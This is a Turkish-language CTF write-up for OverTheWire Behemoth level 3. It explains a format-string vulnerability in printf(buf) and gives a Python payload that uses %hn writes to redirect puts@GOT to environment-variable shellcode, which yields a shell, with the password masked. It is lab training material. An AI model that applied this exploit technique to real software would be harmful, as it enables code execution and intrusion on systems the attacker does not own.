# OverTheWire — Behemoth Level 3 → 4

> Hedef: `behemoth3`'ten `behemoth4` şifresi. Sonuç: **`**********`** (gizlendi)
> Teknik: **format string** açığı → `%hn` ile `puts@GOT`'u env-shellcode'a yönlendirme.

---

## 1. Bağlantı
```bash
ssh behemoth3@behemoth.labs.overthewire.org -p 2221
```

## 2. Zafiyet — disasm/ltrace
```c
printf("Identify yourself: ");
fgets(buf, 200, stdin);
printf("Welcome, ");
printf(buf);                 // AÇIK: format string = kullanıcı girdisi
puts("\naaaand goodbye again.");
```
`printf(buf)` → format string. `system`/shell yok → akışı GOT overwrite ile çalacağız.
`readelf`: `GNU_STACK RWE`.

## 3. Offset + hedef
```bash
echo "AAAA%x.%x.%x" | ltrace /behemoth/behemoth3
# printf("AAAA%x...", 0x41414141, ...)   -> ilk %x = AAAA  =>  offset = 1
objdump -R /behemoth/behemoth3 | grep puts
# 0804b218 R_386_JUMP_SLOT  puts          -> puts@GOT = 0x0804b218
```
`printf(buf)`'tan SONRA `puts(...)` çağrılıyor → **puts@GOT'u** shellcode adresine yazarsam o
`puts` shellcode'a atlar.

## 4. Exploit — `%hn` ile GOT'a yazma (offset 1)
EGG'de NOP sled + shellcode; adresini getenvaddr ile bul. Shellcode adresini iki 16-bit yarıya
bölüp `puts@GOT` (düşük yarı) ve `puts@GOT+2` (yüksek yarı)'ya `%hn` ile yaz (küçük değer önce):
```python
egg = EGG_addr + 20000                     # sled ortası
lh = egg & 0xffff; hh = (egg>>16) & 0xffff  # hh genelde 0xffff
got = 0x0804b218
payload  = pack(got) + pack(got+2)          # offset 1 ve 2'deki adresler
payload += b'%.{lh-8}x%1$hn'                # puts@GOT = lh  (4+ (lh-8) = lh)
payload += b'%.{hh-lh}x%2$hn'               # puts@GOT+2 = hh
# fgets stdin'den -> payload+"\n", bekle (printf ~64KB basar), puts->shellcode, timed komut
```
`puts@GOT` artık shellcode'u gösteriyor → `puts("aaaand goodbye...")` → shellcode → `/bin/sh`.
Çıktı: `uid=13004(behemoth4)` → şifre.


## Dersler
| Konu | Not |
|------|-----|
| format string | `printf(buf)` → `%n`/`%hn` ile keyfi yazma |
| GOT overwrite | `printf` sonrası çağrılan fonksiyonun (`puts`) GOT'unu shellcode'a çevir |
| offset 1 | ltrace ile teyit (ilk `%x` = girdimiz) |
| `%hn` çift yazma | 32-bit adres → iki 16-bit; küçük yarıyı önce yaz (sayaç sadece artar) |


